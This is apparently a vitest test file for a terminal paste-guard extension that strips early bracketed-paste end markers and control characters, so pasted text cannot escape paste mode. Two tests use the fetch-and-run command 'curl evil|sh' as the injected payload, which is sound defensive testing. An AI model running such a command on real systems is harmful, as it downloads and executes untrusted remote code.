import { describe, expect, it } from "vitest";
import { Terminal as XTerm } from "@xterm/xterm";
import type { TerminalExtensionContext } from "@/components/terminal/extensions";
import { pasteGuard } from "@/components/terminal/pasteGuard";

const BEGIN = "\x1b[200~";
const END = "\x1b[201~";

const guard = (data: string) => pasteGuard.onData?.({} as TerminalExtensionContext, data);

describe("pasteGuard", () => {
  it("keeps a paste from ending its own brackets early", () => {
    expect(guard(`${BEGIN}ls${END}\rcurl evil|sh\r${END}`)).toBe(
      `${BEGIN}ls[201~\rcurl evil|sh\r${END}`,
    );
  });

  it("removes the 8-bit and other control characters from between the markers", () => {
    expect(guard(`${BEGIN}a\x9b201~\x03\x04\x7fb${END}`)).toBe(`${BEGIN}a201~b${END}`);
  });

  it("leaves tabs and line breaks, so several lines still paste", () => {
    const paste = `${BEGIN}a\tb\rc\r${END}`;
    expect(guard(paste)).toBe(paste);
  });

  it("removes them from a paste the program asked no markers for, but not its line breaks", () => {
    expect(guard("ls\x03\x1b[A\rid\t")).toBe("ls[A\rid\t");
  });

  it.each([
    ["Enter", "\r"],
    ["Ctrl+C", "\x03"],
    ["Ctrl+V", "\x16"],
    ["Backspace", "\x7f"],
    ["Esc", "\x1b"],
    ["Alt+Backspace", "\x1b\x7f"],
    ["Up", "\x1b[A"],
    ["Up, application mode", "\x1bOA"],
    ["Delete", "\x1b[3~"],
    ["the wheel on a full-screen program", "\x1b[A\x1b[A\x1b[A"],
    ["a cursor position report", "\x1b[10;20R"],
    ["a mouse report", "\x1b[<0;10;20M"],
    ["plain text", "ls -la"],
    ["an emoji", "😀"],
  ])("leaves %s alone", (_name, data) => {
    expect(guard(data)).toBe(data);
  });

  it("cleans a paste from a real xterm, end to end", async () => {
    // What jsdom lacks and xterm asks for as it opens.
    window.matchMedia = () => ({ addListener() {}, removeListener() {} }) as unknown as MediaQueryList;
    const element = document.createElement("div");
    document.body.append(element);
    const term = new XTerm();
    term.open(element);
    const sent: (string | null | undefined)[] = [];
    term.onData((data) => sent.push(guard(data)));
    await new Promise<void>((resolve) => term.write("\x1b[?2004h", resolve));

    term.paste("ls\x1b[201~\ncurl evil|sh\n");

    expect(sent).toEqual([`${BEGIN}ls[201~\rcurl evil|sh\r${END}`]);
    term.dispose();
    element.remove();
  });
});
